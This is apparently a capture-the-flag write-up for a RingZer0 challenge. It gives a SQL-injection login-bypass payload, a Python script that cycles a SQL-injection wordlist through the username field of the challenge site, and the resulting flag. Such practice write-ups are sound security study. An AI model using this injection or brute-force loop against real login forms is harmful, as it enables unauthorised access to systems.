<h1>ACL rulezzz the world</h1>
<h3>Description</h3>
<p>http://challenges.ringzer0ctf.com:10002/</p>
<h3>Solution</h3>

<p>Injection : admin'or'1'=1#</p>

```python3
import requests

wordlist = open("../Wordlist/SQL.txt",'r')
url = "http://challenges.ringzer0ctf.com:10002/"
for i in wordlist:
    i = i.strip('\n')
    data = {"username":i}
    res = requests.post(url,data=data).text
    if "FLAG" in res:
        print(i,"Worked!")
        print(res)
        break

```
<h3>Flag</h3>
<pre>
  FLAG-sdfoip340e89rfuj34woit
</pre>
